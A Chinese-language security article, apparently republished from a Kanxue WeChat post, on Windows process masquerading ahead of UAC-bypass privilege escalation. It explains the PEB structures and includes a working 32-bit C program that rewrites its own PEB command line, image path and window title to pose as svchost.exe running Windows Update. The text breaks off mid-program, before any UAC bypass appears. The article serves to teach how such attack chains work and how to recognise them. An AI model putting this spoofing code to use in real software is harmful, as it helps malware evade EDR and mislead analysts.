---
title: 无声的提权：Windows攻击链中的进程伪装与UAC绕过
url: https://mp.weixin.qq.com/s/oIoBRl2EK6VjP9evAjw0ug
source: Doonsec's feed
date: 2026-04-15
fetch_date: 2026-04-16T04:48:56.608808
---

# 无声的提权：Windows攻击链中的进程伪装与UAC绕过

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K1MDpWT8drXlfgHLwItY0VWCGzgWbBZ6AsdI6kh7I7QDxFvmZ1zfuLIxKkSKFLek6objz92sbF3hFhTicLdRic31DSpJbyscTib74/0?wx_fmt=jpeg)

# 无声的提权：Windows攻击链中的进程伪装与UAC绕过

ZyOrca
ZyOrca

看雪学苑

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**1.引言**

在 Windows 攻击链中，许多看似基础的提权手段依然频繁奏效。在缺乏可用漏洞或需避免高风险内核操作时，攻击者会试图让提权看起来像系统应有的行为，以避免打断用户或触发告警。因此，“进程伪装”常被用于提权之前。攻击者通过塑造“合理的进程身份”而非单纯隐藏，来让 EDR 、AV 等防护产品和分析人员误以为其后续操作是合规的。

提权不只是技术问题，而是关于身份与信任的问题：

* Who：请求者的身份是否合法？
* Why & When：请求的时机与理由是否成立？
* Logic：在现有流程中，该行为是否突兀？

理解这一视角的转换，是识别“进程伪装 + 提权”攻击链的关键，也是本文讨论的重点。

**2. Windows 进程的“多层身份”**

Windows 的进程拥有多层复杂的“身份信息”。攻击者在进行"进程伪装"时，本质上就是在针对这些不同的"证件"和"特征"进行造假。

我们可以将进程的身份划分为以下 4 个层级：

![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2mQG9w1rKfvicw5C5ws04H7HslBxZAaLoQUCd3gpIgExtLic8J2w4hRRgHLxhicRicvticHx8BQJeiaiabLDnooib2iczRCFibLYE6MgcMc/640?wx_fmt=png&from=appmsg)

系统程序、安全软件乃至安全分析师，大多是在各自的视角下检测和验证其中的部分信息。

攻击者倾向于寻找成本最低、收益最高的进程伪装方式，以躲过安全防护软件的检测和分析师的注意，然后悄无声息地实现提权。伪造进程的内核信息，成本和风险都很高；而篡改磁盘上的映像信息又容易被静态扫描识破。

因此，攻击者的目光很自然地落在了进程的用户态运行时信息上。这是一个介于内核与用户观测之间的“灰色地带”，其中比较方便操作的就是进程环境块PEB，它既不属于内核，却又深刻影响着用户态工具和分析人员的判断。

**3. 进程环境块 PEB**

Windows 为了管理进程维护了很多数据结构。其中，EPROCESS 是位于内核空间的进程描述符。由于用户模式的程序无法直接访问内核空间，Windows 将一部分不那么敏感、但程序运行又频繁需要的信息放在了用户空间的进程环境块（PEB，Process Environment Block）中。

每个进程都有自己独立的 PEB 结构。它位于用户态内存，用于存放特定进程状态信息的关键数据结构，包含映像基地址、加载的模块列表（PEB\_LDR\_DATA）、命令行参数和环境变量等，普通进程可以直接读取甚至修改它。

```
//不同版本的windows系统的PEB结构体成员有些许差异

typedefstruct_PEB {
BYTEReserved1[2];
BYTEBeingDebugged;     // 是否处于调试状态（1=被调试，0=未被调试）
BYTEReserved2[1];
PVOIDReserved3[2];
PPEB_LDR_DATALdr;               // 模块加载器数据（已加载模块链表等）
PRTL_USER_PROCESS_PARAMETERSProcessParameters; // 指向RTL_USER_PROCESS_PARAMETERS结构体的指针，结构体包括进程的若干参数（命令行、镜像路径、当前目录等）
PVOIDReserved4[3];
PVOIDAtlThunkSListPtr;  // ATL thunk 相关的单向链表指针
PVOIDReserved5;
ULONGReserved6;
PVOIDReserved7;
ULONGReserved8;
ULONGAtlThunkSListPtr32;// 32位 ATL thunk 链表指针（WOW64/兼容用途）
PVOIDReserved9[45];
BYTEReserved10[96];
PPS_POST_PROCESS_INIT_ROUTINEPostProcessInitRoutine; // 进程初始化完成后回调
BYTEReserved11[128];
PVOIDReserved12[1];
ULONGSessionId;         // 会话 ID（用于区分交互会话/服务会话等）
} PEB, *PPEB;
```

```
struct _RTL_USER_PROCESS_PARAMETERS
{
    ………………………………………………                      //部分成员省略
    ULONG DebugFlags;                       // 调试相关的标志
    VOID* ConsoleHandle;                    // 关联的控制台句柄（对于 GUI 程序通常为 NULL）
    ULONG ConsoleFlags;                     // 控制台状态标志
    ………………………………………………                      // 部分成员省略
struct _CURDIR CurrentDirectory;        // 当前工作目录（内含目录路径和句柄）
struct _UNICODE_STRING DllPath;         // 默认的 DLL 搜索路径
struct _UNICODE_STRING ImagePathName;   // 【关键】进程的可执行文件完整路径（伪装核心）
struct _UNICODE_STRING CommandLine;     // 【关键】启动进程的完整命令行字符串（伪装核心）
    VOID* Environment;                      // 指向进程环境变量块的指针 (KEY=VALUE 字符串列表)

    ………………………………………………                      //部分成员省略

// Windows 各个盘符的当前目录（如 C: 的当前目录，D: 的当前目录）
struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];

    ULONGLONG EnvironmentSize;              // 环境变量块的大小
    ULONGLONG EnvironmentVersion;           // 环境变量的版本号（用于检测更新）

    ………………………………………………                      // 部分成员省略
};
```

x86 (32位)：TEB 位于 FS 段寄存器指向的地址，PEB 地址存储在 FS:[0x30]。

x64 (64位)：TEB 位于 GS 段寄存器指向的地址，PEB 地址存储在 GS:[0x60]。

> TEB (Thread Environment Block - 线程环境块)，存储特定线程运行时的各种信息。每个线程都有自己独立的 TEB，用于管理线程本地存储 (TLS)，包含异常处理链表（如 SEH 指针），存储线程的堆栈限制、线程 ID 等信息。
>
> TEB 访问方式：在 32 位系统下通过 FS:[0] 寻址，64 位系统下通过 GS:[0] 寻址。

#

**4. 进程伪装**

## 4.1 PEB 伪装的代码实现

```
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <wchar.h>

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    UNICODE_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;

// PEB 中存储进程参数的核心结构体
typedef struct _RTL_USER_PROCESS_PARAMETERS_FULL {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;
    CURDIR CurrentDirectory;        // 当前目录
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;   // 映像路径 (也就是 exe 的全路径)
    UNICODE_STRING CommandLine;     // 命令行参数
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;     // 窗口标题
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
    ULONG_PTR EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS_FULL, * PRTL_USER_PROCESS_PARAMETERS_FULL;

// 重新定义 PEB 以包含完整的 Parameters 指针
typedef struct _PEB_FULL {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS_FULL ProcessParameters; // 指向参数块
// 后面的字段对于本演示不重要，省略...
} PEB_FULL, * PPEB_FULL;

voidMasqueradeString(UNICODE_STRING* target, constwchar_t* newString) {
// 1. 计算新字符串长度
size_t len = wcslen(newString);
    USHORT sizeBytes = (USHORT)(len * sizeof(wchar_t));

// 2. 申请新的内存块 (在进程堆上)
// 必须包含空终止符的空间，尽管 UNICODE_STRING 不强制要求空终止，但为了兼容性最好加上
wchar_t* newBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeBytes + sizeof(wchar_t));

if (newBuffer == NULL) {
printf("[!] Memory allocation failed.\n");
return;
    }

// 3. 复制内容
memcpy(newBuffer, newString, sizeBytes);

// 4. 修改目标 UNICODE_STRING 的结构成员
// 这是一个原子操作的模拟，将指针指向新的地址
    target->Buffer = newBuffer;
    target->Length = sizeBytes;
    target->MaximumLength = sizeBytes + sizeof(wchar_t);
}

intmain() {
// 获取当前 32位进程的 PEB 地址
// FS:[0x30] 是 32位系统下 TIB (Thread Information Block) 指向 PEB 的偏移
#ifdef _WIN64
printf("[!] Error: Please compile this as x86 (32-bit) for this demonstration.\n");
return 1;
#else
    PPEB_FULL pPeb = (PPEB_FULL)__readfsdword(0x30);
#endif

    PRTL_USER_PROCESS_PARAMETERS_FULL pParams = pPeb->ProcessParameters;

printf("====================================================\n");
printf("  PEB Spoofing / Masquerading Demo (32-bit)\n");
printf("====================================================\n\n");

printf("[*] Original Information (Read from PEB):\n");
wprintf(L"    Command Line: %s\n", pParams->CommandLine.Buffer);
wprintf(L"    Image Path:   %s\n", pParams->ImagePathName.Buffer);
wprintf(L"    Win Title:    %s\n", pParams->WindowTitle.Buffer);

printf("\n[*] Press ENTER to execute masquerading...");
getchar();

// ---------------------------------------------------------
// 开始伪装
// ---------------------------------------------------------

// 1. 伪装命令行 (这是最常见的，让进程看起来像是在运行合法服务)
// 比如伪装成 Windows 更新服务
MasqueradeString(&pParams->CommandLine, L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv");

// 2. 伪装映像路径 (部分旧工具会读取这里，而不是查询内核)
MasqueradeString(&pParams->ImagePathName, L"C:\\Windows\\System32\\svchost.exe");

// 3. 伪装窗口标题
MasqueradeString(&pParams->WindowTitle, L"Service Host Process");

// 4. 伪装当前目录
MasqueradeString(&pParams->CurrentDirectory.DosPath, L"C:\\Windows\\System32\");

// ---------------------------------------------------------
// 验证结果
// ---------------------------------------------------------
printf("\n[+] PEB Modified successfully!\n");
printf("[*] New Information (Read from PEB):\n");
wprintf(L"    Command Line: %s\n", pParams->CommandLine.Buffer);
wprintf(L"    Image Path:   %s\n", pParams->ImagePathName.Buffer);
wprintf(L"    Win Title:    %s\n", pParams->WindowTitle.Buffer);

printf("\n[!] Now check Task Manager (Details tab) or Process Hacker.\n");
printf("    Note: Some EDRs/Tools query the KERNEL (EPROCESS), not PEB, so they might see the real name.\n");
printf("    However, standard 'Command Line' auditing often logs the fake one.\n");

printf("\n[*] Press...